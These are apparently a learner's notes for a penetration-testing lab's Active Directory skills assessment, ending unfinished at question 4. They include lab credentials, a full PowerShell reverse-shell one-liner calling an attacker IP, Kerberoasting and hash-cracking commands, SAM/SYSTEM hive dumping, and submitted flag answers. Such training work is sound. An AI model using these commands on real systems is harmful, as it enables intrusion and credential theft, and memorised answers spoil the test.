Scenario
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

xfreerdp /v:10.129.2.44 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop


$client = New-Object System.Net.Sockets.TCPClient('10.10.14.128',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


Question 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server - JusT_g3tt1ng_st@rt3d!
1) go to http://10.129.202.242/uploads/antak.aspx 
2) login with provided creds 
3) revsheslls.com -> powershell reverse shell to copy into webshell we logged into 
4) nc -nlvp 4445 on host machine 
5) get connection
6) cd C:\Users\Administrator\Desktop 
7) get-content flag.txt - JusT_g3tt1ng_st@rt3d!
 


Question 2 - Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer - svc_sql
1) on Host machine run sudo mv /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 . to move poweview to desktop
2) python3 -m http.server 
3) ON REVERSEHLLLLL -> Invoke-WebRequest -URI "http://10.10.14.128:8000/PowerView.ps1" -OutFile ./PowerView.ps1 
4) ON REVERSE SHELL -> Import-Module ./PowerView.ps1
5) ON REVERSE SHELL -> Get-NetUser -SPN | select name,samaccountname,serviceprincipalname,description
6) OutPut: svc_sql      svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433                                            
 





Question 3 - Crack the account's password. Submit the cleartext value.
1) Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
2) Get-Content ilfreight_tgs.csv
3) copy and paste all output to note ( or just svbc_sql) 
4) hashcat -m 13100 sqlhash /usr/share/wordlists/rockyou.txt 
5) output of cracked hash = lucky7 


Question 4 -  Submit the contents of the flag.txt file on the Administrator desktop on MS01
1) ON REVERSE SHELL -> mkdir c:\tools
2) cd C:\tools 
3) reg.exe save hklm\sam C:\tools\sam.save
reg.exe save hklm\system C:\tools\system.save
reg.exe save hklm\security C:\tools\security.save
4) this is where im stuck trying to transfer back to Host machine



Question 5 - Find cleartext credentials for another domain user. Submit the username as your answer.



Question 6 -  Submit this user's cleartext password.



Question 7 -  Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01



Question 8 - 
